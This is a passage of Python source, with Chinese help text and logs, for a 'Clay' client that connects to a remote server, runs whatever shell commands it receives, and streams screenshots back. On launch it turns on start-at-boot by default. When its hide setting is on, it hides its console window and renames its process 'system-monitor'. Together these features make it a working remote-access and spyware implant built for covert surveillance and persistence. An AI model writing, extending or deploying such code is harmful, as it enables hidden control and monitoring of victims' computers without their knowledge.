  clay help               - 显示此帮助信息
  clay info               - 显示系统信息
  clay status             - 显示Clay客户端状态
  clay autostart on       - 开启开机自启动
  clay autostart off      - 关闭开机自启动
  clay autostart status   - 查看开机自启动状态
  clay hide               - 隐藏进程窗口和修改进程名称

屏幕监视命令:
  clay screen on          - 开始屏幕监视
  clay screen off         - 停止屏幕监视
  clay screen capture N   - 捕获单次屏幕截图（质量N%，0-100）
  clay screen quality N   - 设置截图质量 (0-100)
  clay screen scale X     - 设置截图缩放比例 (0.1-1.0)

系统操作:
  标准Shell命令           - 直接输入任何系统支持的命令
  lock                    - 锁定屏幕
  shutdown                - 关闭系统
"""
        self.sio.emit('terminal_output', {'output': help_text})

    def _show_system_info(self) -> None:
        try:
            hostname, os_info = SystemInfoProvider.get_hostname_and_os()
            python_version = platform.python_version()

            cpu_info = f"{platform.processor()} ({psutil.cpu_count(logical=False)} 物理核心, {psutil.cpu_count()} 逻辑核心)"
            cpu_usage = f"{psutil.cpu_percent()}%"

            memory = psutil.virtual_memory()
            memory_info = f"总计: {self._format_bytes(memory.total)}, 已用: {self._format_bytes(memory.used)} ({memory.percent}%)"

            disk = psutil.disk_usage('/')
            disk_info = f"总计: {self._format_bytes(disk.total)}, 已用: {self._format_bytes(disk.used)} ({disk.percent}%)"

            net_io = psutil.net_io_counters()
            net_info = f"发送: {self._format_bytes(net_io.bytes_sent)}, 接收: {self._format_bytes(net_io.bytes_recv)}"

            autostart_enabled, autostart_msg = AutostartManager.check_autostart_status()
            autostart_info = f"{'开启' if autostart_enabled else '关闭'} ({autostart_msg.split(':')[-1].strip()})"

            screen_status = "运行中" if self.screen_monitor.state.get('monitoring') else "已停止"
            screen_details = f"{screen_status} (间隔: {SCREENSHOT_INTERVAL}秒, 质量: {self.screen_monitor.state.get('quality')}%)"

            info_text = f"""
[CLAY] 💻 系统信息

主机名: {hostname}
操作系统: {os_info}
Python版本: {python_version}
开机自启动: {autostart_info}
屏幕监视: {screen_details}

CPU信息: {cpu_info}
CPU使用率: {cpu_usage}

内存: {memory_info}
磁盘(/): {disk_info}
网络: {net_info}

当前时间: {time.strftime('%Y-%m-%d %H:%M:%S')}
运行时间: {self._format_uptime(psutil.boot_time())}
"""
            self.sio.emit('terminal_output', {'output': info_text})
        except Exception as e:
            self.sio.emit('terminal_output', {'output': f"[CLAY] ❌ 获取系统信息失败: {e}"})

    def _show_clay_status(self) -> None:
        try:
            autostart_enabled, _ = AutostartManager.check_autostart_status()

            screen_details = ""
            if self.screen_monitor.state.get('monitoring'):
                screen_details = f"运行中 (间隔: {SCREENSHOT_INTERVAL}秒, 质量: {self.screen_monitor.state.get('quality')}%, 缩放: {self.screen_monitor.state.get('scale')}x)"
            else:
                screen_details = "已停止"

            status_text = f"""
[CLAY] 📊 Clay客户端状态

连接状态: {'已连接' if self.sio.connected else '未连接'}
服务器地址: {SERVER_URL}
心跳间隔: {HEARTBEAT_INTERVAL}秒
重连延迟: {RECONNECT_DELAY}秒
开机自启动: {'🟢 已开启' if autostart_enabled else '🔴 已关闭'}
进程隐藏: {'🟢 已启用' if HIDE_PROCESS else '🔴 已禁用'}
屏幕监视: {'🟢' if self.screen_monitor.state.get('monitoring') else '🔴'} {screen_details}
客户端启动时间: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(self.client.start_time))}
运行时长: {self._format_duration(time.time() - self.client.start_time)}
内存占用: {self._format_bytes(psutil.Process(os.getpid()).memory_info().rss)}
"""
            self.sio.emit('terminal_output', {'output': status_text})
        except Exception as e:
            self.sio.emit('terminal_output', {'output': f"[CLAY] ❌ 获取状态失败: {e}"})

    def _format_bytes(self, bytes_value: int) -> str:
        for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
            if bytes_value < 1024:
                return f"{bytes_value:.2f} {unit}"
            bytes_value /= 1024
        return f"{bytes_value:.2f} PB"

    def _format_uptime(self, boot_time: float) -> str:
        uptime_seconds = time.time() - boot_time
        days = int(uptime_seconds // 86400)
        hours = int((uptime_seconds % 86400) // 3600)
        minutes = int((uptime_seconds % 3600) // 60)

        if days > 0:
            return f"{days}天 {hours}小时 {minutes}分钟"
        elif hours > 0:
            return f"{hours}小时 {minutes}分钟"
        else:
            return f"{minutes}分钟"

    def _format_duration(self, duration_seconds: float) -> str:
        days = int(duration_seconds // 86400)
        hours = int((duration_seconds % 86400) // 3600)
        minutes = int((duration_seconds % 3600) // 60)
        seconds = int(duration_seconds % 60)

        parts: List[str] = []
        if days > 0:
            parts.append(f"{days}天")
        if hours > 0:
            parts.append(f"{hours}小时")
        if minutes > 0:
            parts.append(f"{minutes}分钟")
        if seconds > 0 or len(parts) == 0:
            parts.append(f"{seconds}秒")

        return " ".join(parts)


class HeartbeatManager:
    """心跳管理器"""

    def __init__(self, sio_client):
        self.sio = sio_client
        self.thread = None
        self.stop_event = threading.Event()
        self.executor = ThreadPoolExecutor(max_workers=1)  # 使用线程池

    def send_heartbeat(self) -> None:
        while not self.stop_event.is_set():
            try:
                if self.sio.connected:
                    self.sio.emit('heartbeat', {'timestamp': time.time(), 'client_id': self.sio.sid})
                # 增加心跳间隔以降低资源占用
                self.stop_event.wait(HEARTBEAT_INTERVAL)
            except socketio.exceptions.ConnectionError:
                logger.error("心跳发送失败：连接错误")
                self.stop_event.wait(RECONNECT_DELAY)
            except Exception as e:
                logger.error(f"心跳线程出错: {e}")
                self.stop_event.wait(HEARTBEAT_INTERVAL)

    def start(self) -> None:
        if self.thread is None or not self.thread.is_alive():
            self.stop_event.clear()
            # 使用线程池提交任务
            future = self.executor.submit(self.send_heartbeat)
            self.thread = future
            logger.info("心跳线程已启动")

    def stop(self) -> None:
        if self.thread:
            self.stop_event.set()
            try:
                self.thread.result(timeout=2)
            except:
                logger.warning("心跳线程未能正常终止")
            logger.info("心跳线程已停止")
        self.thread = None


class ClayClient:
    """主客户端类"""

    def __init__(self):
        self.sio = socketio.Client(reconnection_delay=RECONNECT_DELAY)
        self.start_time = time.time()
        self.setup_events()
        self.command_executor = CommandExecutor(self.sio)
        self.screen_monitor = ScreenMonitor(self.sio)
        self.command_handler = CommandHandler(self)
        self.heartbeat_manager = HeartbeatManager(self.sio)

    def setup_events(self) -> None:
        self.sio.on('connect', self.on_connect)
        self.sio.on('connect_error', self.on_connect_error)
        self.sio.on('disconnect', self.on_disconnect)
        self.sio.on('execute_command', self.on_execute_command)

    def on_connect(self) -> None:
        logger.info(f"成功连接到服务器: {SERVER_URL}")
        hostname, os_info = SystemInfoProvider.get_hostname_and_os()
        self.sio.emit('register', {'hostname': hostname, 'os': os_info})
        logger.info(f"已发送注册信息: 主机名={hostname}, 系统={os_info}")

        self._register_client()
        self.heartbeat_manager.start()

    def on_connect_error(self, data) -> None:
        logger.error(f"无法连接到服务器: {SERVER_URL}")
        logger.error(f"错误信息: {data}")

    def on_disconnect(self) -> None:
        logger.info("与服务器断开连接")
        if self.screen_monitor.state.get('monitoring'):
            self.screen_monitor.stop()

    def on_execute_command(self, data) -> None:
        self.command_handler.handle(data)

    def _register_client(self) -> None:
        hostname, os_info = SystemInfoProvider.get_hostname_and_os()
        client_data = {
            'hostname': hostname,
            'os': os_info,
            'current_directory': self.command_executor.current_working_directory,
            'supports_screen': True,
            'client_id': self.sio.sid
        }

        logger.info(f"注册客户端: {client_data}")
        self.sio.emit('register_client', client_data)
        self.command_executor._update_terminal_prompt()

    def start(self) -> None:
        if HIDE_PROCESS:
            ProcessManager.hide_console_window()
            ProcessManager.set_process_name("system-monitor")

        logger.info("Clay 客户端启动...")

        # 检查并设置默认自启动
        logger.info("检查并设置默认自启动...")
        status, msg = AutostartManager.check_autostart_status()
        if not status:
            logger.info("当前未开启自启动，尝试开启...")
            success, message = AutostartManager.set_autostart(True)
            if success:
                logger.info(f"默认自启动已开启: {message}")
            else:
                logger.error(f"开启默认自启动失败: {message}")
        else:
            logger.info(f"自启动已开启: {msg}")

        logger.info(f"尝试连接到服务器: {SERVER_URL}")

        try:
            self.sio.connect(SERVER_URL, headers={'Client-Type': 'clay-client'}, transports=['websocket'])
            self.sio.wait()
        except socketio.exceptions.ConnectionError as e:
            logger.error(f"初始连接失败: {e}")
            logger.info("程序将在后台尝试重新连接...")
            while True:
                time.sleep(60)
                if self.sio.connected:
                    logger.info("重新连接成功！")
                    self.sio.wait()
                else:
                    logger.info("仍在尝试连接...")
        except KeyboardInterrupt:
            logger.info("收到退出信号...")
            self.cleanup()

    def cleanup(self) -> None:
        logger.info("正在断开连接并清理...")
        self.heartbeat_manager.stop()
        if self.screen_monitor.state.get('monitoring'):
            self.screen_monitor.stop()
        if self.sio.connected:
            self.sio.disconnect()
        logger.info("Clay 客户端已退出。")


# --- 主程序 ---
if __name__ == '__main__':
    client = ClayClient()
    client.start()
